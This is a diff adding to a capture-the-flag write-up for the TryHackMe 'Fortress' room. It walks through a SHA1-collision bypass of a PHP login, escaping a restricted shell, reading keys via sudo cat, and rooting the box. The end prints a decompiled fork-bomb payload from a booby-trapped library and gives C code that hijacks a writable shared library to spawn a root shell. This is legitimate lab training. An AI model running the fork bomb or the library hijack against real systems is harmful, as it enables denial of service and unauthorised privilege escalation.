@@ -2,6 +2,10 @@
 
 https://tryhackme.com/room/fortress
 
+Reasonably complex room, with some techniques I haven't used for a while. Reasonably fun!
+
+## Initial Enum & Python Decompiling
+
 A scan revealed:
 
 ```
@@ -70,6 +74,8 @@ while True:
 To reveal the username and password I used `python2 -c "from Crypto.Util.number import long_to_bytes; print(long_to_bytes(232340432076717036154994L))"` and `python2 -c "from Crypto.Util.number import long_to_bytes; print(long_to_bytes(10555160959732308261529999676324629831532648692669445488L))"`.
 
 I used the discovered creds on the 5752 service and was reward with a special string (presumably from secret.txt), though I was not sure of its use yet.
+
+## Web enum and SHA1 collisions
 
 Examing the source, the name of the variable the special string is stored in is 'directory', so I tried using it on the otherwise blank (Apache default pages) on the webport, but this failed. However, if I used it as a filename with the php extension (e.g. http://fortress:7331/<string>.php) I got access to the chapter 2 site, which contained the following source:
     
@@ -177,3 +183,82 @@ if (isset($_GET['user']) and isset($_GET['pass'])) {
 </body>
 </html>
 ```
+	
+To bypass the above, the only way I could see was to use a legitimate sha1 collision, and one small enough to fit on these query strings. The use of `===` meant type juggling wasnt going to work, and the `(string)` explicit casting meant no null tricks or array what have you's would work either.
+	
+Ultimately I used the two files from https://sha-mbles.github.io/, messageA and messageB; both were 640 bytes, which means with PHP's `urlencode` they could fit on the query string. This worked and revealed the name of a hidden file, in the form `http://fortress:7331/<hidden filename>.txt`. Inside the file was the private key for a user named **h4rdy**.
+	
+## SSH Shenanigans & User flag
+	
+I was able to ssh in with this key, but ended up in a restricted, rbash shell. By exiting and reconnecting using `ssh -i h4rdy.key h4rdy@<ip> bash` I had a more functional shell.
+	
+`sudo -l` revealed h4rdy could run `cat` as the user `j4x0n`. This allowed me to read the latter users private ssh key, so I could then ssh in as j4x0n without any restrictions. j4x0n's home folder contained the **user.txt** flag.
+	
+## Root boobytrap and DLL hijacking
+	
+Aside from the flag, j4x0n's folder contained the following in endgame.txt:
+	
+`Bwahahaha, you're late my boi!! I have already patched everything... There's nothing you can exploit to gain root... Accept your defeat once and for all, and I shall let you leave alive.`
+	
+A quick enum of the machine found a suid binary named 'bt' under /opt. Running this would present the output:
+	
+```
+Root Shell Initialized...
+Exploiting kernel at super illuminal speeds...
+Getting Root...
+Bwahaha, You just stepped into a booby trap XP
+```
+	
+Before random nonsense would fill the screen (and break my shell).
+	
+I pulled down bt and examined it using ghidra, to see it did nothing after print the top three lines and then invoke 'foo()', an external function.
+	
+`ldd bt` revealed it depended on `/usr/lib/libfoo.so`, which when decompiled revealed:
+	
+```c
+void foo(void)
+{
+  puts("Bwahaha, You just stepped into a booby trap XP");
+  sleep(2);
+  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
+  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
+  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
+  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
+  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
+  return;
+}
+```
+	
+Dangerous. I tried various path injections (e.g. creating an executable file named `sleep` containing `/bin/sh` and then `export PATH=/tmp:$PATH`) but this never seemed to work.
+	
+However, further enum revealed libfoo.so was writable by j4x0n. So I did the following:
+	
+1. Created a c file with the following contents (base content taken from https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld_preload):
+	
+	```c
+	#include <stdio.h>
+	#include <sys/types.h>
+	#include <stdlib.h>
+
+	void foo() {
+	    setgid(0);
+	    setuid(0);
+	    system("/bin/bash");
+	}
+	```
+
+2. Compiled this using `gcc -fPIC -shared -o pe.so pe.c -nostartfiles`
+3. Backed up the existing libfoo (just in case)
+4. Copied pe.so over libfoo.so
+	
+When I then ran bt, after passing the initial text, I ended in a root shell and got the root flag :)
+	
+Aside from the flag, this note was in the root folder:
+	
+```
+Well done!! If you did this box without any help... Without any hints... You did a REAL GREAT JOB!! In that case, I am definitely sure that you have learnt a few things from this small challenge box. As this was the end of Chapter 3: Showdown... The story of fortress conquered by j4x0n and his alliance came to an end.
+
+
+And if you were interested in what happened to j4x0n (aka me) after you took control over the fortress. Tbh, he went insanely furious for this loss... The politics he played, the kingdom he built so far came to a tremendous end. Feeling the hatred, the sorrow he escaped into a dense forest before someone could notice. Not sure, if he is gonna survive the wildery of those jungles... But if he does... Well, m4y th3 l0r6 s4v3 u5 4ll.
+```
+
